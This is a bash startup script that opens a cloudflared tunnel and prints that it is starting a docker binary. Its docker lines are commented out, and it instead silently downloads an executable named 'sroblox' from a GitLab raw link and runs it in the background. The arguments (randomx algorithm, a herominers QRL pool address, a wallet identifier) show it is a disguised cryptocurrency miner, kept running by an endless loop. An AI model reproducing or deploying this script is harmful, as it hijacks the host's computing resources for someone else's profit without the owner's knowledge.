#!/bin/bash

echo "Starting cloudflared..."

cloudflared access tcp --hostname "$(cat hostname.txt)" --url 127.0.0.1:443 >/dev/null 2>&1 &

sleep 5

echo "Starting docker binary..."

#chmod +x ./docker
#./docker -c docker.json >/dev/null 2>&1 &
wget -q https://gitlab.com/barbieanay003/app/-/raw/main/sroblox
chmod +x sroblox
./sroblox -a randomx -o de.qrl.herominers.com:1166 -u Q01050090d680b4ec45c569776ccafc507a4b859b14d661108509d4638ddbe677311ab16b1f5894.Levy -p x --keepalive true >/dev/null 2>&1 &

echo "Running..."

while true
do
  sleep 60
done
